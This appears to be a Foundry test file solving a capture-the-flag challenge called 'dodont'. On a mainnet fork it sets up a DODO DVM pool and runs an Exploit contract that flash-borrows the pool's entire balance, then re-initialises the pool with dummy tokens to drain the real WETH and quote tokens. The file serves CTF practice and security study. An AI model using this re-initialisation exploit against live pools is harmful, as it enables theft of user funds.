// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {dodont as Challenge} from "../src/9.Dodont/dodont.sol";

interface CloneFactoryLike {
    function clone(address) external returns (address);
}

interface DVMLike {
    function _BASE_TOKEN_() external returns (ERC20);
    function _QUOTE_TOKEN_() external returns (ERC20);

    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function buyShares(address) external;

    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract QuoteToken is ERC20 {
    constructor() ERC20("Quote Token", "QT") {
        _mint(msg.sender, 1_000_000 ether);
    }
}

contract dodontTest is Test {
    CloneFactoryLike private immutable CLONE_FACTORY = CloneFactoryLike(0x5E5a7b76462E4BdF83Aa98795644281BdbA80B88);
    address private immutable DVM_TEMPLATE = 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445;

    IERC20 private immutable WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address public deployer;
    Challenge public challenge;
    address public attacker;
    DVMLike dvm;

    function setUp() public {
        /////////////////////////////
        ///      Select Fork      //
        /////////////////////////////

        string memory key = "MAINNET_RPC_URL";
        string memory MAINNET_RPC_URL = vm.envString(key);
        uint256 forkId = vm.createFork(MAINNET_RPC_URL, 16_543_210);
        vm.selectFork(forkId);

        ///////////////////////////////
        ///      Challenge Setup     //
        ///////////////////////////////
        attacker = makeAddr("attacker");
        deployer = makeAddr("deployer");
        payable(address(WETH)).call{value: 100 ether}(hex"");

        QuoteToken quoteToken = new QuoteToken();

        dvm = DVMLike(CLONE_FACTORY.clone(DVM_TEMPLATE));
        dvm.init(
            address(deployer),
            address(WETH),
            address(quoteToken),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );

        WETH.transfer(address(dvm), WETH.balanceOf(address(deployer)));
        quoteToken.transfer(address(dvm), quoteToken.balanceOf(address(deployer)) / 2);
        dvm.buyShares(address(deployer));

        challenge = new Challenge(address(dvm));
    }

    function testExploitdodont() public {
        vm.startPrank(attacker);
        uint256 baseBalance = dvm._BASE_TOKEN_().balanceOf(address(dvm));
        uint256 quoteBalance = dvm._QUOTE_TOKEN_().balanceOf(address(dvm));
        console.log("baseBalance:", baseBalance);
        console.log("quoteBalance:", quoteBalance);

        Exploit exp = new Exploit();
        dvm.flashLoan(baseBalance, quoteBalance, address(exp), "hack");

        console.log("isSolved: ", challenge.isSolved());
    }
}

contract Exploit {
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        DummyToken baseDum = new DummyToken(msg.sender, baseAmount);
        DummyToken quoteDum = new DummyToken(msg.sender, quoteAmount);

        DVMLike(msg.sender).init(
            address(0),
            address(baseDum),
            address(quoteDum),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );
    }
}

contract DummyToken is ERC20 {
    constructor(address to, uint256 amount) ERC20("Dummy Token", "DT") {
        _mint(to, amount);
    }
}
